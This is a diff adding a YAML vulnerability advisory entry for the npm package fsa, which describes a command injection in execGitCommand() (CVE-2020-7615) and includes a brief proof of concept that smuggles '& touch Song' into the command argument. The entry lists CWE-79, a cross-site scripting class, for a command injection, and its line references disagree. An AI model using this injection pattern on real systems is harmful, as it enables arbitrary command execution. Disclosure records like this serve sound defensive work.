@@ -1,0 +1,39 @@
+---
+- id: snykio:npm:fsa:564118
+  title: Command Injection
+  description: |
+    [fsa][1] is a File system auditor.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The first argument of `execGitCommand()`, located within `lib/rep.js#63`
+    can be controlled by users without any sanitization to inject arbitrary
+    commands.
+
+    ### PoC   {#poc}
+
+        var root = require("fsa");
+        var attack_code = "& touch Song";
+        var dir = "./";
+        var options= {};
+        root.rep.execGitCommand(attack_code,dir,options,function(){});
+
+
+
+    [1]: https://www.npmjs.com/package/fsa
+  affected_package: fsa
+  vulnerable_versions:
+  - "*"
+  severity: low
+  package_manager: npm
+  cve:
+  - CVE-2020-7615
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-04-01
+  created_date: 2020-04-01
+  last_modified_date: 2020-04-01
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/gregof/fsa/blob/master/lib/rep.js#L12
+  source_url: https://snyk.io/vuln/SNYK-JS-FSA-564118
